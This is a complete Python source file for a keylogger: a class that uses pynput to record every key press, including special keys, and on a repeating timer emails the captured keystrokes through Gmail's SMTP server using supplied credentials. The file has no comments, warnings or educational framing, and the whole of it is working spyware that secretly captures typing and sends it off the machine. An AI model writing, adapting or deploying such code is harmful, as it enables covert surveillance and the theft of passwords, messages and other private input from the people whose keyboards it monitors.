#!/usr/bin/env python

import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self, time_interval, email, passwd):
        self.logger = "Keylogger-Started"
        self.interval = time_interval
        self.email = email
        self.passwd = passwd

    def append_to_logger(self, string):
        self.logger = self.logger + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = " Etr "
            elif key == key.tab:
                current_key = " Tb "
            elif key == key.backspace:
                current_key = " Bk "
            elif key == key.right:
                current_key = " rt "
            elif key == key.left:
                current_key = " lt "
            elif key == key.up:
                current_key = " up "
            elif key == key.down:
                current_key = " dn "
            else:
                current_key = " " + str(key) + " "
        self.append_to_logger(current_key)

    def report(self):
        self.send_mail(self.email, self.passwd, "\n\n" + self.logger)
        self.logger = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    def send_mail(self, email, passwd, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, passwd)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press = self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
